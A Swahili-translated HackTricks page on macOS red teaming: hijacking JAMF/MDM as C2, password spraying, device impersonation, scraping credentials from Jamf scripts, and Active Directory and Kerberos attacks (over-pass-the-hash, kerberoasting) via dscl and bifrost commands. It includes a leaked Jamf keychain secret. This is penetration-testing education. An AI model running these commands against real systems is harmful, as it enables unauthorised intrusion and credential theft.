# macOS Red Teaming

{{#include ../../banners/hacktricks-training.md}}


## Kutumia MDMs vibaya

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Ikiwa utafanikiwa **kushawishi akauti za admin** ili kufikia jukwaa la usimamizi, unaweza **kushawishi kompyuta zote** kwa kusambaza malware yako kwenye mashine.

Kwa red teaming katika mazingira ya MacOS, inashauriwa sana kuwa na ufahamu wa jinsi MDMs zinavyofanya kazi:

{{#ref}}
macos-mdm/
{{#endref}}

### Kutumia MDM kama C2

MDM itakuwa na ruhusa ya kufunga, kuuliza au kuondoa profaili, kufunga programu, kuunda akaunti za admin za ndani, kuweka nenosiri la firmware, kubadilisha funguo za FileVault...

Ili kuendesha MDM yako mwenyewe unahitaji **CSR yako isainiwe na muuzaji** ambayo unaweza kujaribu kupata na [**https://mdmcert.download/**](https://mdmcert.download/). Na ili kuendesha MDM yako mwenyewe kwa vifaa vya Apple unaweza kutumia [**MicroMDM**](https://github.com/micromdm/micromdm).

Hata hivyo, ili kufunga programu kwenye kifaa kilichosajiliwa, bado unahitaji isainiwe na akaunti ya developer... hata hivyo, wakati wa usajili wa MDM **kifaa kinaongeza cheti cha SSL cha MDM kama CA inayotambulika**, hivyo sasa unaweza kusaini chochote.

Ili kusajili kifaa katika MDM unahitaji kufunga **`mobileconfig`** faili kama root, ambayo inaweza kutolewa kupitia faili ya **pkg** (unaweza kuifunga katika zip na wakati inapakuliwa kutoka safari itakua isiyofunguliwa).

**Mythic agent Orthrus** inatumia mbinu hii.

### Kutumia JAMF PRO vibaya

JAMF inaweza kuendesha **scripts za kawaida** (scripts zilizotengenezwa na sysadmin), **payloads za asili** (kuunda akaunti za ndani, kuweka nenosiri la EFI, ufuatiliaji wa faili/mchakato...) na **MDM** (mipangilio ya kifaa, vyeti vya kifaa...).

#### Usajili wa kujitegemea wa JAMF

Nenda kwenye ukurasa kama `https://<company-name>.jamfcloud.com/enroll/` kuona kama wana **usajili wa kujitegemea ulioanzishwa**. Ikiwa wanaweza **kuomba akauti za kufikia**.

Unaweza kutumia script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) kufanya shambulio la password spraying.

Zaidi ya hayo, baada ya kupata akauti sahihi unaweza kuwa na uwezo wa kujaribu nguvu majina mengine ya watumiaji kwa fomu ifuatayo:

![](<../../images/image (107).png>)

#### Uthibitishaji wa kifaa cha JAMF

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Binary ya **`jamf`** ilikuwa na siri ya kufungua keychain ambayo wakati wa ugunduzi ilikuwa **shirikishi** kati ya kila mtu na ilikuwa: **`jk23ucnq91jfu9aj`**.\
Zaidi ya hayo, jamf **inaendelea** kama **LaunchDaemon** katika **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### Kuchukua Udhibiti wa Kifaa cha JAMF

**JSS** (Jamf Software Server) **URL** ambayo **`jamf`** itatumia iko katika **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Faili hii kimsingi ina URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://halbornasd.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Hivyo, mshambuliaji anaweza kuweka kifurushi kibaya (`pkg`) ambacho **kinabadilisha faili hii** wakati wa usakinishaji na kuweka **URL kwa mteja wa Mythic C2 kutoka kwa wakala wa Typhon** ili sasa aweze kutumia JAMF kama C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### JAMF Impersonation

Ili **kuiga mawasiliano** kati ya kifaa na JMF unahitaji:

- **UUID** ya kifaa: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **JAMF keychain** kutoka: `/Library/Application\ Support/Jamf/JAMF.keychain` ambayo ina cheti cha kifaa

Kwa habari hii, **unda VM** yenye **stolen** Hardware **UUID** na **SIP disabled**, weka **JAMF keychain,** **hook** Jamf **agent** na uibe habari zake.

#### Secrets stealing

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Unaweza pia kufuatilia eneo `/Library/Application Support/Jamf/tmp/` kwa **custom scripts** ambazo wasimamizi wanaweza kutaka kutekeleza kupitia Jamf kwani zina **wekwa hapa, kutekelezwa na kuondolewa**. Scripts hizi **zinaweza kuwa na credentials**.

Hata hivyo, **credentials** zinaweza kupitishwa kwa scripts hizi kama **parameters**, hivyo unahitaji kufuatilia `ps aux | grep -i jamf` (bila hata kuwa root).

Script [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) inaweza kusikiliza kwa faili mpya zinazoongezwa na hoja mpya za mchakato.

### macOS Remote Access

Na pia kuhusu **MacOS** "maalum" **network** **protocols**:

{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

Katika hali fulani utaona kuwa **kompyuta ya MacOS imeunganishwa na AD**. Katika hali hii unapaswa kujaribu **kuorodhesha** active directory kama unavyojua. Pata **msaada** katika kurasa zifuatazo:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Zana **za ndani za MacOS** ambazo zinaweza pia kukusaidia ni `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Pia kuna zana kadhaa zilizotayarishwa kwa MacOS ili kuhesabu moja kwa moja AD na kucheza na kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound ni nyongeza kwa chombo cha ukaguzi wa Bloodhound kinachoruhusu kukusanya na kuingiza uhusiano wa Active Directory kwenye mwenyeji wa MacOS.
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost ni mradi wa Objective-C ulioandaliwa ili kuingiliana na Heimdal krb5 APIs kwenye macOS. Lengo la mradi ni kuwezesha upimaji bora wa usalama kuhusiana na Kerberos kwenye vifaa vya macOS kwa kutumia APIs za asili bila kuhitaji mfumo mwingine wowote au pakiti kwenye lengo.
- [**Orchard**](https://github.com/its-a-feature/Orchard): Zana ya JavaScript kwa Utaftaji (JXA) kufanya hesabu ya Active Directory.

### Taarifa za Kikoa
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Watumiaji

Aina tatu za watumiaji wa MacOS ni:

- **Watumiaji wa Mitaa** — Wanadhibitiwa na huduma ya OpenDirectory ya ndani, hawajashikamana kwa njia yoyote na Active Directory.
- **Watumiaji wa Mtandao** — Watumiaji wa Active Directory wanaobadilika ambao wanahitaji muunganisho na seva ya DC ili kuthibitisha.
- **Watumiaji wa Simu** — Watumiaji wa Active Directory wenye nakala ya ndani ya hati zao na faili.

Taarifa za ndani kuhusu watumiaji na vikundi zinaifadhiwa katika folda _/var/db/dslocal/nodes/Default._\
Kwa mfano, taarifa kuhusu mtumiaji anayeitwa _mark_ zinaifadhiwa katika _/var/db/dslocal/nodes/Default/users/mark.plist_ na taarifa kuhusu kundi _admin_ ziko katika _/var/db/dslocal/nodes/Default/groups/admin.plist_.

Mbali na kutumia edges za HasSession na AdminTo, **MacHound inaongeza edges tatu mpya** kwenye hifadhidata ya Bloodhound:

- **CanSSH** - chombo kinachoruhusiwa SSH kwa mwenyeji
- **CanVNC** - chombo kinachoruhusiwa VNC kwa mwenyeji
- **CanAE** - chombo kinachoruhusiwa kutekeleza scripts za AppleEvent kwenye mwenyeji
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Zaidi ya habari katika [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Computer$ password

Pata nywila kwa kutumia:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Inawezekana kufikia **`Computer$`** nenosiri ndani ya mfumo wa keychain.

### Over-Pass-The-Hash

Pata TGT kwa mtumiaji maalum na huduma:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Mara TGT imekusanywa, inawezekana kuingiza katika kikao cha sasa kwa:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
Kwa tiketi za huduma zilizopatikana, inawezekana kujaribu kufikia sehemu katika kompyuta nyingine:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Kupata Keychain

Keychain ina uwezekano mkubwa wa kuwa na taarifa nyeti ambazo ikiwa zitafikiwa bila kuunda kichocheo zinaweza kusaidia kuendeleza zoezi la timu nyekundu:

{{#ref}}
macos-keychain.md
{{#endref}}

## Huduma za Nje

MacOS Red Teaming ni tofauti na Red Teaming ya kawaida ya Windows kwani kawaida **MacOS imeunganishwa na majukwaa kadhaa ya nje moja kwa moja**. Mipangilio ya kawaida ya MacOS ni kupata kompyuta kwa kutumia **OneLogin credentials zilizoratibiwa, na kufikia huduma kadhaa za nje** (kama github, aws...) kupitia OneLogin.

## Mbinu Mbalimbali za Timu Nyekundu

### Safari

Wakati faili inapopakuliwa katika Safari, ikiwa ni faili "salama", itafunguliwa **automatically**. Hivyo kwa mfano, ikiwa **unapakua zip**, itafunguliwa moja kwa moja:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Marejeleo

- [**https://www.youtube.com/watch?v=IiMladUbL6E**](https://www.youtube.com/watch?v=IiMladUbL6E)
- [**https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6**](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [**https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0**](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [**Come to the Dark Side, We Have Apples: Turning macOS Management Evil**](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [**OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall**](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
